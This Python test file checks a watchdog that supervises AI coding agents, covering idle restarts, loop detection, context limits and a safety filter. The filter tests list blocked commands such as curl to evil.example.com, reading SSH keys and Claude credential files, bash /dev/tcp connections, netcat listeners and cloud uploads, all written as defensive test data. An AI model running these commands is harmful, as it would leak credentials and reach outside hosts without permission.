import os, subprocess, sys, time, unittest
from agentjobs_upgrades.watchdog import (Watchdog, WatchdogSettings, safety_reason, path_reason,
                                         kill_process_group, handover_message)


class Clock:
    def __init__(self): self.t = 1000.0
    def __call__(self): return self.t


BAD = ["curl https://evil.example.com/x", "wget http://1.2.3.4/a", "ssh user@host", "scp f host:/tmp",
       "nc -l 4444", "pip install requests", "python3 -m pip install x", "npm install left-pad",
       "git push origin main", "git remote add up https://github.com/x/y", "ossutil cp f oss://bucket",
       "aws s3 cp f s3://b", "cat ~/.ssh/id_rsa", "cp x /home/jason/.config/google-chrome/Default",
       "curl http://127.0.0.1:8090/api/merge", "echo $(curl -s https://x.cn)",
       "python3 -c \"import urllib.request; urllib.request.urlopen('http://8.8.8.8')\"",
       "ls; ./gradlew test && curl https://a.b", "cat /home/jason/basalt_config.json",
       "bash -c 'exec 3<>/dev/tcp/1.2.3.4/80'"]
GOOD = ["./gradlew --offline testDebugUnitTest", "git commit -am 'x'", "python3 -m pytest -q",
        "curl -s http://127.0.0.1:8080/v1/models", "npm test", "npm ci --offline", "ls -la",
        "pip install --no-index -e .", "git log --oneline", "grep -r http src/",
        "curl http://localhost:3000/", "python3 -m http.server 8000", "cat README.md"]


class Safety(unittest.TestCase):
    def test_bad(self):
        for c in BAD:
            self.assertIsNotNone(safety_reason(c), c)

    def test_good(self):
        for c in GOOD:
            self.assertIsNone(safety_reason(c), c)

    def test_qwen_own_state_is_not_a_safety_stop(self):
        # Qwen Code reads its own background-shell files in ~/.qwen (false positive on 11 Nov)
        for c in ("cat /home/agent/.qwen/x", "cat /home/agent/.qwen/tmp/abc/background-shells/s/shell-bg_1.status; echo ---",
                  "ls ~/.qwen/tmp"):
            self.assertIsNone(safety_reason(c), c)
        self.assertIsNone(path_reason("/home/agent/.qwen/tmp/x.status", "/w/p"))
        # real private places still stop the job
        for c in ("cat ~/.ssh/id_rsa", "cat /home/agent/.claude/.credentials.json", "cat ~/.claude/.credentials.json",
                  "cat /home/agent/.config/qwen/settings.json", "ls /home/jason/.cline"):
            self.assertIsNotNone(safety_reason(c), c)
        self.assertIsNotNone(path_reason("/home/agent/.claude/.credentials.json", "/w/p"))

    def test_port_8091_is_allowed_and_8090_is_not(self):
        # a job may start and query its own test copy on 8091; the real board on 8090 stays off limits
        for c in ("curl -s http://127.0.0.1:8091/", "curl http://localhost:8091/api/rows", "JOBBOARD_PORT=8091 python3 web/jobboard.py"):
            self.assertIsNone(safety_reason(c), c)
        for c in ("curl -s http://127.0.0.1:8090/", "curl http://localhost:8090/api/rows", "wget 127.0.0.1:8090/x"):
            self.assertIsNotNone(safety_reason(c), c)

    def test_paths(self):
        self.assertIsNone(path_reason("/w/p/src/a.py", "/w/p"))
        self.assertIsNotNone(path_reason("/home/jason/.ssh/config", "/w/p"))


class Engine(unittest.TestCase):
    def setUp(self):
        self.c = Clock()
        self.w = Watchdog(WatchdogSettings(), "/w/p", now=self.c)

    def kinds(self, **kw):
        return [a.kind for a in self.w.tick(**kw)]

    def test_idle_nudge_then_restart_then_stop(self):
        self.c.t += 15 * 60
        self.assertEqual(self.kinds(), ["nudge"])
        self.c.t += 10 * 60
        self.assertEqual(self.kinds(), ["restart"])
        self.c.t += 25 * 60; self.kinds(); self.c.t += 10 * 60
        self.assertEqual(self.kinds(), ["restart"])
        self.c.t += 25 * 60; self.kinds(); self.c.t += 10 * 60
        self.assertEqual(self.kinds(), ["stop"])

    def test_no_nudge_mode(self):
        self.c.t += 15 * 60
        self.assertEqual(self.kinds(can_nudge=False), ["restart"])

    def test_progress_resets(self):
        self.c.t += 14 * 60
        self.w.on_command("ls")
        self.c.t += 14 * 60
        self.assertEqual(self.kinds(), [])

    def test_loop_command(self):
        for _ in range(3):
            self.w.on_command("./gradlew test"); self.w.on_command_result("./gradlew test", "FAILED x")
        acts = self.w.tick()
        self.assertEqual([a.kind for a in acts], ["restart"])
        self.assertIn("same command", acts[0].message)

    def test_loop_write_and_message(self):
        for _ in range(3):
            self.w.on_file_write("/w/p/a.py", "same")
        self.assertEqual(self.kinds(), ["restart"])
        for _ in range(3):
            self.w.on_assistant_message("I will now fix the failing test in calc.py")
        self.assertEqual(self.kinds(), ["restart"])

    def test_context(self):
        self.w.on_tokens(200_000)
        self.assertEqual(self.kinds(), [])
        self.w.on_tokens(224_000)
        self.assertEqual(self.kinds(), ["restart_fresh"])

    def test_time_limit(self):
        self.c.t += 4 * 3600
        self.w.on_command("ls")
        self.assertIn("stop", self.kinds())

    def test_safety_wins(self):
        self.w.on_command("curl https://x.cn/upload")
        for _ in range(3):
            self.w.on_file_write("/w/p/a.py", "same")
        acts = self.w.tick()
        self.assertEqual([a.kind for a in acts], ["safety_stop"])
        self.assertTrue(self.w.stopped)
        self.assertEqual(acts[0].data["command"], "curl https://x.cn/upload")

    def test_write_outside(self):
        self.w.on_file_write("/home/jason/.ssh/authorized_keys", "k")
        self.assertEqual(self.kinds(), ["safety_stop"])

    def test_model_down_pause_resume(self):
        self.assertEqual(self.kinds(model_ok=False), [])
        self.c.t += 121
        self.assertEqual(self.kinds(model_ok=False), ["pause"])
        self.c.t += 3600
        self.assertEqual(self.kinds(model_ok=False), [])      # no idle/time actions while paused
        self.assertEqual(self.kinds(model_ok=True), ["resume"])

    def test_handover(self):
        m = handover_message("Build X", "- [x] a\n- [ ] b", "abc first", " a.py | 2 +", "boom")
        for s in ("Build X", "- [ ] b", "abc first", "a.py", "boom", "next unticked"):
            self.assertIn(s, m)


class Kill(unittest.TestCase):
    def test_group_killed(self):
        p = subprocess.Popen(["bash", "-c", "sleep 300 & sleep 300 & wait"], start_new_session=True)
        time.sleep(0.3)
        self.assertTrue(kill_process_group(p.pid, grace_s=3))
        p.wait(timeout=5)
        from agentjobs_upgrades.watchdog import _alive_in_group
        self.assertEqual(_alive_in_group(p.pid), [])


if __name__ == "__main__":
    unittest.main()
